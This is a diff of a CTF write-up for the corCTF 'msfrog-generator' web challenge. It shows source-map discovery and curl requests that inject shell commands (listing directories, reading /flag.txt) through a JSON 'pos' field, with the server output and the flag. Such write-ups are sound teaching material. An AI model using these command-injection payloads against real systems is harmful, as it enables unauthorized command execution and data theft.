@@ -8,23 +8,23 @@ The vanilla msfrog is hard to beat, but this webapp allows you to make it even b
 ## Solution
 Opening up the site we see a canvas and some items to add to it and a button download it.
 Looking at the source i see a javascript file     `/static/js/main.88f9e0db.js` and a comment:
-```!
+```htmlmixed!
 <!-- NOTE: There is no (intended) vuln in the frontend, please don't waste your time digging into the JS ;)  -->
 ```
 Having read the comment I still decied to check out the js file which was heavily minified. At the end of the file I notice another comment:
-```
+```javascript
 //# sourceMappingURL=main.88f9e0db.js.map
 ```
 A quick google search up later I find this info about the extension:
 ```!
 From https://stackoverflow.com/questions/21719562/how-can-i-use-javascript-source-maps-map-files
 
-The .map files are for JavaScript and CSS (and now TypeScript too)  files that have been minified.
+The .map files are for JavaScript and CSS (and now TypeScript too) files that have been minified.
 What is it for?     To de-reference uglified code
 Chrome: Open dev-tools, navigate to Sources tab. You will see the sources folder, where un-minified applications files are kept.
 ```
 And sure enough opening dev tools->sources all the js files are visible. Looking through them trying to find something useful I find a file which includes an api call to generate the image `static->js->components->MsButton->MsButton.js`
-```
+```javascript
 let jsonData = [];
     placedItems.forEach((item) => {
       jsonData.push({ type: item.type, pos: item.pos });
@@ -54,24 +54,24 @@ let jsonData = [];
 I set breakpoints to view jsonData:
 `[{"type":"mstongue.png","pos":{"x":0,"y":0}}]`
 At this point I got a bit stuck, but later while fuzzing with the data I got this:
-```!
+```bash!
 > curl -X POST https://msfrog-generator.be.ax/api/generate -d '[{"type":"lol","pos":{"x":0,"y":0}}]' -H "Content-Type: application/json"
 
 I wont pass a non existing image to a shell command lol
 ```
 Trying to inject some commands in the "type" value didn't work, so then I tried the pos values:
-```!
+```bash!
 > curl -X POST https://msfrog-generator.be.ax/api/generate -d '[{"type":"mstongue.png","pos":{"x":0,"y":"; ls;"}}]' -H "Content-Type: application/json"
 
 {"msfrog": "fe\nimg\nserver.py\nwsgi.py\n"}
 ```
-```!
+```bash!
 > curl -X POST https://msfrog-generator.be.ax/api/generate -d '[{"type":"mstongue.png","pos":{"x":0,"y":"; ls /;"}}]' -H "Content-Type: application/json"
 
 {"msfrog": "app\nbin\nboot\ndev\netc\nflag.txt\nhome\nlib\nlib32\nlib64\nlibx32\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"}
 ```
 Then just cat the flag
-```!
+```bash!
 > curl -X POST https://msfrog-generator.be.ax/api/generate -d '[{"type":"mstongue.png","pos":{"x":0,"y":"; cat /flag.txt;"}}]' -H "Content-Type: application/json"
 
 {"msfrog": "corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}\n"}
@@ -79,4 +79,5 @@ Then just cat the flag
 ## Flag
 corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}
 ## Thoughts
-This was kind of an interesting chall, but I think it was too guessy
+This was kind of an interesting chall, but I think it was guessy.
+Note: I had messed up my network tab during the challenge by putting something in the filter accidentally so no requests showed up for me, so I had to use breakpoints. Noticed that only after the ctf ended..
